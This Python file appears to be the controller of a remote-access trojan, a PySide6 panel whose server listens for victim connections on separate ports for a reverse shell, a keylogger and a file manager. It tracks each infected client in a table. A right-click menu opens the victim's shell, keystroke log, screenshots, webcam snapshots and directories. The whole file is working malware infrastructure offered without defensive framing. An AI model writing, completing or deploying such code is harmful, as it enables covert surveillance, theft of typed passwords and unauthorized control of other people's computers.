import socket
import threading
import psutil

from PySide6.QtCore import QObject, QPoint
from PySide6.QtWidgets import QMenu, QTableWidgetItem
from .Client_Handler import Client

class Server_Functions(QObject):
    def __init__(self, main_window):
        super().__init__()
        self.main_window = main_window
        self.ui = main_window.ui
        
        self.list_clients = []
        self.cur_client = None
        self.initialize_network()
        self.setup_connections()
        
    def initialize_network(self):
        """Initialize network connections and server sockets"""
        self.SERVER_HOST = self.get_wifi_ipv4()
        self.SERVER_PORT_KEYLOGGER = 5000
        self.SERVER_PORT_SHELL = 5005
        self.SERVER_PORT_MANAGE_FILE = 5050
        self.BUFFER_SIZE = 1024 * 128
        self.SEPARATOR = "<sep>"
        
        # Initialize sockets
        self.s1 = self.create_server_socket(self.SERVER_PORT_SHELL)
        self.s2 = self.create_server_socket(self.SERVER_PORT_KEYLOGGER)
        self.s3 = self.create_server_socket(self.SERVER_PORT_MANAGE_FILE)
        
        # Start listener threads
        self.start_listeners()

    def get_wifi_ipv4(self):
        """Get WiFi IPv4 address"""
        for interface, addrs in psutil.net_if_addrs().items():
            if "Wi-Fi" in interface or "Wireless" in interface:
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        return addr.address
        return None

    def create_server_socket(self, port):
        """Create and configure a server socket"""
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((self.SERVER_HOST, port))
        s.listen(5)
        return s

    def start_listeners(self):
        """Start all listener threads"""
        t1 = threading.Thread(target=self.reverse_shell_handler)
        t2 = threading.Thread(target=self.keylogger_handler) 
        t3 = threading.Thread(target=self.file_manager_handler)
        
        t1.daemon = True
        t2.daemon = True
        t3.daemon = True
        
        t1.start()
        t2.start()
        t3.start()

    def reverse_shell_handler(self):
        """Handle reverse shell connections"""
        print(f"Listening as {self.SERVER_HOST}:{self.SERVER_PORT_SHELL} ...")
        while True:
            socket, client_add = self.s1.accept()
            print(f"{client_add[0]}:{client_add[1]} Connected!")
            
            cwd = socket.recv(self.BUFFER_SIZE).decode()
            self.ui.second_window[self.ui.cnt].print_text(f"{cwd} $>")
            self.ui.second_window[self.ui.cnt].socket = socket
            
            infor = socket.recv(self.BUFFER_SIZE).decode()
            list_infor = infor.split(self.SEPARATOR)
            self.add_client_to_table(list_infor)
            
            self.handle_new_client_connection(socket, list_infor[1])

    def keylogger_handler(self):
        """Handle keylogger connections"""
        print(f"Listening as {self.SERVER_HOST}:{self.SERVER_PORT_KEYLOGGER} ...")
        while True:
            socket, _ = self.s2.accept()
            if self.cur_client:
                self.cur_client.add_keylog(socket)
                self.increment_client_count()

    def file_manager_handler(self):
        """Handle file manager connections"""
        print(f"Listening as {self.SERVER_HOST}:{self.SERVER_PORT_MANAGE_FILE} ...")
        while True:
            socket, client_add = self.s3.accept()
            self.ui.manage_file_window[self.ui.cnt].socket = socket
            if self.cur_client:
                self.cur_client.add_manage_file(socket)
                print(f"{client_add[0]}:{client_add[1]} Connected!")
                self.increment_client_count()

    def add_client_to_table(self, client_info):
        """Add new client to the table widget"""
        self.ui.add_row(client_info[0], client_info[1], client_info[2])
        self.ui.keylog_window[self.ui.cnt].setWindowTitle(f"{client_info[1]}@KeyLog")
        self.ui.keylog_window[self.ui.cnt].filename = f"{client_info[1]}.txt"

    def handle_new_client_connection(self, socket, client_name):
        """Handle setup for new client connection"""
        if not self.cur_client:
            self.cur_client = Client(self.ui.cnt, self.ui)
        self.cur_client.increase()
        
        if self.cur_client.cnt == 3:
            self.list_clients.append(self.cur_client)
            self.cur_client.cnt += 1
            self.ui.cnt += 1
            self.cur_client = Client(self.ui.cnt, self.ui)

    def increment_client_count(self):
        """Increment client counter and handle client list management"""
        if self.cur_client.cnt == 3:
            self.list_clients.append(self.cur_client)
            self.cur_client.cnt += 1
            self.ui.cnt += 1
            self.cur_client = Client(self.ui.cnt, self.ui)

    def setup_context_menu(self):
        """Setup right-click context menu for table widget"""
        self.ui.tableWidget.setContextMenuPolicy(QtCore.Qt.ContextMenuPolicy.CustomContextMenu)
        self.ui.tableWidget.customContextMenuRequested.connect(self.show_context_menu)

    def show_context_menu(self, position: QPoint):
        """Show context menu at clicked position"""
        row = self.ui.tableWidget.rowAt(position.y())
        if row == -1:
            return

        context_menu = QMenu(self.ui.tableWidget)
        actions = {
            "Remote shell": lambda: self.ui.second_window[row].show(),
            "Keylog file": lambda: self.show_keylog(row),
            "Screen shot": lambda: self.ui.second_window[row].screen_shot("src"),
            "Webcam snapshot": lambda: self.ui.second_window[row].screen_shot("webcam"),
            "Show directory": lambda: self.ui.manage_file_window[row].show()
        }

        for label, handler in actions.items():
            action = context_menu.addAction(label)
            action.triggered.connect(handler)

        context_menu.exec(self.ui.tableWidget.mapToGlobal(position))

    def show_keylog(self, row):
        """Show keylog window for selected client"""
        self.ui.keylog_window[row].readfile()
        self.ui.keylog_window[row].show()